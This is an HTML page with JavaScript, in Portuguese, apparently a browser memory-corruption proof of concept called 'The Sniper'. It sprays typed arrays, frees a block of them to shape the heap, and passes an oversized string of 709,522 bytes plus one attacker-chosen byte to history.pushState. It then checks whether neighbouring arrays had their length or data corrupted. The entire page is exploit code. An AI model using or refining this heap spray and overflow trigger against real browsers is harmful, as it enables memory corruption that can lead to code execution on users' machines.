<!DOCTYPE html>
<html>
<head>
    <title>The Sniper: 709523 Precision</title>
    <style>
        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; padding: 20px; }
        .panel { border: 2px solid #ff0000; padding: 20px; background: #100; margin-bottom: 20px; text-align: center; }
        .log { height: 350px; overflow-y: scroll; border: 1px solid #500; padding: 10px; background: #100; color: #fcc; text-align: left; }
        
        button { 
            padding: 15px 30px; cursor: pointer; background: #500; 
            color: #fff; border: 2px solid #f00; font-weight: bold; font-size: 18px; margin: 10px; 
            transition: 0.1s;
        }
        button:hover { background: #f00; color: #000; }
        
        input { background: #000; border: 1px solid #f00; color: #f00; padding: 8px; width: 60px; text-align: center; font-size: 20px; }
    </style>
</head>
<body>
    <h1>THE SNIPER: 709522 + 1</h1>
    <div class="panel">
        <p>Base Fixa: <strong>709.522 bytes</strong></p>
        <p>O Byte da Corrupção (709.523):</p>
        
        <div style="margin-bottom: 20px;">
            BYTE (HEX): <input type="text" id="byteVal" value="01">
        </div>

        <button onclick="runSniper()">DISPARAR (Spray + Overflow)</button>
    </div>

    <div id="logger" class="log">Aguardando disparo...</div>

    <script>
        const logger = document.getElementById('logger');
        // A SUA BASE EXATA
        const BASE_SIZE = 709522; 
        
        // Vamos testar o buraco que você achou mais estável antes
        const HOLE_SIZE = 168; 
        
        const SPRAY_SIZE = 8000;
        const MAGIC_NUM = 0x41414141;

        var spray = [];

        function log(msg, type='') {
            const d = document.createElement('div');
            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type === 'success') { d.style.color = '#fff'; d.style.background = '#0a0'; }
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        async function runSniper() {
            let hexVal = document.getElementById('byteVal').value;
            let byteInt = parseInt(hexVal, 16);

            log("---------------------------------------");
            log(`PREPARANDO: Base ${BASE_SIZE} + Byte 0x${hexVal} -> Total 709523`);

            // 1. Limpeza Rápida
            spray = null;
            if(window.gc) window.gc();
            // Pequeno delay apenas para garantir que a memória limpou
            await new Promise(r => setTimeout(r, 200)); 
            
            spray = [];

            // 2. Spray Tático
            // Criamos os alvos
            log("Alocando alvos...");
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM;
                arr[1] = i;
                spray.push(arr);
            }

            // 3. Abrir o Buraco (Onde vai cair a bomba)
            let center = 4000;
            log(`Abrindo buraco de ${HOLE_SIZE} no index ${center}...`);
            for(let i=0; i < HOLE_SIZE; i++) {
                spray[center + i] = null;
            }

            // 4. A Pausa da Morte
            // Precisamos que o GC rode para consolidar o buraco, mas não queremos perder tempo depois.
            log("Sincronizando GC...");
            await new Promise(r => setTimeout(r, 800));

            try {
                // 5. Construção do Payload
                log("Construindo Payload...");
                let base = new Array(BASE_SIZE + 1).join('A');
                let overflow = String.fromCharCode(byteInt); // O byte 709523
                
                let payload = base + overflow;

                // 6. INJEÇÃO IMEDIATA
                log("!!! INJETANDO !!!");
                history.pushState({}, "pwn_" + Date.now(), payload);
                
                // 7. VERIFICAÇÃO INSTANTÂNEA
                // Não esperamos nada. Checamos agora antes que o sistema caia.
                checkCorruption(HOLE_SIZE, center);

            } catch(e) {
                log("ERRO: " + e.message);
            }
        }

        function checkCorruption(holeUsed, startIdx) {
            log("Varredura de emergência...");
            let found = false;
            // Checamos apenas os vizinhos imediatos para ganhar tempo
            let limit = startIdx + holeUsed + 20; 

            for(let i = startIdx + holeUsed; i < limit; i++) {
                if (i >= spray.length) break;
                let arr = spray[i];
                if(arr) {
                    // SE O TAMANHO MUDOU
                    if(arr.length !== 1024) {
                        found = true;
                        document.body.style.background = "#0f0";
                        document.body.innerHTML = `<h1 style="color:black; font-size:50px;">ALVO ABATIDO!</h1><h2>Index: ${i}</h2><h2>Novo Length: ${arr.length}</h2>`;
                        alert("SUCESSO! Length: " + arr.length);
                        return;
                    }
                    
                    // SE O DADO MUDOU
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        log(`DADO ALTERADO no Index ${i}: 0x${arr[0].toString(16)}`, 'success');
                    }
                }
            }
            if(!found) log("Nenhum dano visível. O byte caiu no vazio ou o valor é inócuo.");
        }
    </script>
</body>
</html>
